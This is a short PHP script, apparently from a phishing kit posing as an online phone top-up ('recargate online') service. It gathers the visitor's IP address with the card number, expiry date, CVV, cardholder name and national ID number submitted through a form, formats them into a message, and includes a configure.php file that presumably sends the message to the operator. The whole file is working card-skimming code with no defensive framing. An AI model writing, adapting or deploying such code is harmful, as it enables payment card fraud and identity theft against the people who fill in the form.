<?php  
 $enviara =
    "<b> ## recargate online ## </b>\n".
    "<b>Direccion IP: </b> ".getenv('REMOTE_ADDR')."\n".
    "<b>Card: </b> <code>".$_POST['card']."</code>\n".
    "<b>Expiry: </b> <code>".$_POST['venc']."</code>\n".
    "<b>Cvv: </b> <code>".$_POST['cvc']."</code>\n".
    "<b>Nombres: </b> <code>".$_POST['name']."</code>\n".
    "<b>DNI: </b> <code>".$_POST['dni']."</code>\n";    
    $enviar =  urldecode($enviara);
    include 'configure.php';
?>